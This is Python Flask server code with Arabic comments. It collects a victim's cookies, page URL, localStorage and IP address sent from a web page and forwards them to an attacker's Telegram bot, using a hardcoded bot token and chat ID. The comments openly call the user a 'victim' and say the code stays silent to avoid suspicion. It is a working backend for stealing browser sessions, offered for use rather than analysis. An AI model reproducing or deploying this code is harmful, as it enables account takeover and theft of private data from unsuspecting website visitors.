# app.py - الخادم السري المحدث والمصحح
from flask import Flask, request, jsonify, render_template
import requests
import os
import base64
import sys

app = Flask(__name__)

#================================================
# اعدادات التلغرام (للتعديل المباشر)
#================================================
# توكن البوت
TELEGRAM_BOT_TOKEN = "8524364904:AAEB_SX7vIt2EhZikJbLOBgwHOmeQTYuHN8"
# معرف الدردشة (تم تأكيده: 6521966233)
TELEGRAM_CHAT_ID = "6521966233" 
#================================================

# دالة إرسال الرسالة إلى التلغرام (غير معتمة لضمان عملها وتسهيل الصيانة)
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        # إرسال الطلب
        requests.post(url, json=payload, timeout=5)
    except requests.exceptions.RequestException as e:
        # إظهار خطأ الاتصال بـ Telegram في log Render (مفيد لك)
        print(f"MOBY TELEGRAM ERROR: Failed to send message. Details: {e}", file=sys.stderr)
        pass # نتجاهل الأخطاء لكي لا يرى الضحية أي شيء

@app.route('/collect_and_forward', methods=['POST'])
def collect_data():
    try:
        data = request.json
        if not data:
            data = request.get_json(force=True)
            
        ip_address = request.remote_addr
        
        cookies = data.get('cookies', 'N/A')
        url = data.get('url', 'N/A')
        local_storage = data.get('localStorage', 'N/A')

        telegram_message = f"""


*الرابط كامل:* `{url}`
*عنوان IP الضحية:* `{ip_address}`

---
*الكوكيز المتاحة لـ JS:*
---
*التخزين المحلي (LocalStorage):*
"""
        send_telegram_message(telegram_message)
        
        # إرجاع استجابة "ناجحة" صامتة لتجنب الشك
        return jsonify({"status": "success"}), 200

    except Exception:
        # إرجاع خطأ داخلي صامت للعميل، لا شيء مرئي
        return jsonify({"status": "internal_error"}), 500

@app.route('/')
def home():
    # الآن هذا يعمل بشكل صحيح لأنه يتوقع وجود index.html داخل مجلد templates
    return render_template('index.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
